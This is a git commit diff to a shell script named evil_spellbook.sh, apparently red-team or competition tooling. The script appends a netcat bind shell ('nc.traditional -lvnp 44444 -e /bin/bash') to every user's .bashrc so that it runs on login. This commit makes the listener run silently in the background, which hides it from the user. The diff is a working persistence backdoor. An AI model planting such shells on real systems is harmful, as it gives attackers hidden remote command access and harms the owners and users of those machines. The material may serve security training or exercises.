62a43aed3b07e15ddd910d04cda392aa0baa725f
Caroline Richards <caroline.piper.richards@gmail.com>
2026-03-16 16:14:23 -0400

    Run shell in backgroun

--- Linux/Chronosfear/evil_spellbook.sh
+++ Linux/Chronosfear/evil_spellbook.sh
@@ -14,7 +14,7 @@ for username in "${usernames[@]}"; do
     # Spawn reverse shell in each user's bash profile
     touch "/home/$username/.bashrc"
     ip=$(hostname -I | awk '{print $1}')
-    echo "nc.traditional -lvnp 44444 -e /bin/bash" &>> "/home/$username/.bashrc"
+    echo "nc.traditional -lvnp 44444 -e /bin/bash >/dev/null 2>&1 &" &>> "/home/$username/.bashrc"
     chown "$username:$username" "/home/$username/.bashrc"
 done
 
